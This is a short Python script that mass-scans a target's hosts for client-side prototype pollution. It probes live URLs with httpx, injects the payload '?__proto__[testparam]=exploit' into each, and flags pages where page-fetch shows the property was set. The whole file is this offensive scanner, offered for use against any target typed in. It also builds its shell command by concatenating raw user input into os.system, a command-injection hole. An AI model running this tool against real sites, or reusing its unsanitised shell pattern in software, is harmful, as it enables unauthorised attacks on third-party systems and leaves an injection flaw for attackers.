from os import system

msg = input("Enter the target (bing.com): ")

# system('cat {}.txt | waybackurls > {}urls.txt')

system("cat " + msg + ".txt | httpx -silent -threads 300 | anew -q alive.txt && sed 's/$/\\/?__proto__[testparam]=exploit\\//' alive.txt | page-fetch -j 'window.testparam == \"exploit\" ? \"[VULNERABLE]\" : \"[NOT VULNERABLE]\"' | sed 's/(//g' | sed 's/)//g' | sed 's/JS //g' | grep 'VULNERABLE'")
system("rm -rf alive.txt")
